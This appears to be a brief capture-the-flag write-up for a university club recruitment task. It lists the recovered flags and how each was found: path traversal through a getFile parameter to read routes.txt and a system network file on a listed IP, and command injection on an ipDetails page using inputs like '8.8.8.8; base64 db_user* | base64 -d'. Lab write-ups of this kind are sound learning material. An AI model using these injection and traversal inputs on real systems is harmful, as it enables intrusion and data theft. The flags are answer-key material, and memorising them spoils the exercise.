# PCLUBRecruitmentTask-8
pclub{path_trav3rsa1_1s_fun}
this flag was present in the routes.txt file, which could be accessed via path traversal via getFile?file=routes.txt
pclub{WiredinIITK@123}
this was found by decoding the db_user.json file via command injection in in ipDetails page, [8.8.8.8; base64 db_user* | base64 -d]
60:45:bd:af:3f:e5
this mac address was found via path traversal, http://74.225.254.195:2324/getFile?file=/sys/class/net/eth0/address
60:45:bd:af:3f:e5
the mac address could also be found via 8:8:8:8;ifconfig; command injection on the ipdetails page
